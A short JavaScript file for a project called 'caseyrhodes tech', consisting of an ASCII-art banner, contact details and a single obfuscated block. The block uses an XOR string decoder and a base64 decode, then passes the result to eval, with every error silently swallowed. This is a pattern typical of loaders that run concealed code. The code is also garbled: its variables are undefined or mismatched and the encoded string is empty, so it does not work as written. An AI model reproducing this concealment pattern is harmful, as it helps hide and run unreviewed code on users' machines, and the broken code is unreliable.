/*

 _____                                 _                 _            
/  __ \                               | |               | |           
| /  \/  __ _  ___   ___  _   _  _ __ | |__    ___    __| |  ___  ___ 
| |     / _` |/ __| / _ \| | | || '__|| '_ \  / _ \  / _` | / _ \/ __|
| \__/\| (_| |\__ \|  __/| |_| || |   | | | || (_) || (_| ||  __/\__ \
 \____/ \__,_||___/ \___| \__, ||_|   |_| |_| \___/  \__,_| \___||___/
                           __/ |                                      
                          |___/                                       

 _____              _     
|_   _|            | |    
  | |    ___   ___ | |__  
  | |   / _ \ / __|| '_ \ 
  | |  |  __/| (__ | | | |
  \_/   \___| \___||_| |_|
@ Project Name : caseyrhodes tech 
* Creator      : Caseyrhodes Tech 
* My Git       : https//github.com/caseyweb 
* Contact      : wa.me/254112192119
*
* Release Date : 18 august 2025 12.01 AM
*/
(function() {
  try {
    (function(_0x553a53, _0x260584) {
  const _0x3747 = function(_0x99e3) {
    let _0x8b1e = '';
    for (let i = 0; i < _0xc534.length; i++) {
      _0x6129 += String.fromCharCode(_0xc030.charCodeAt(i) ^ _0x12f70b);
    }
    return _0x238d;
  };
  const _0x75b8 = Buffer.from('', 'base64').toString('utf-8');
  const _0x1779 = _0xb89a(_0x85ae);
  eval(_0x46cb);
})(71, 251);
  } catch (e) {
    // Silent error handling
  }
})();
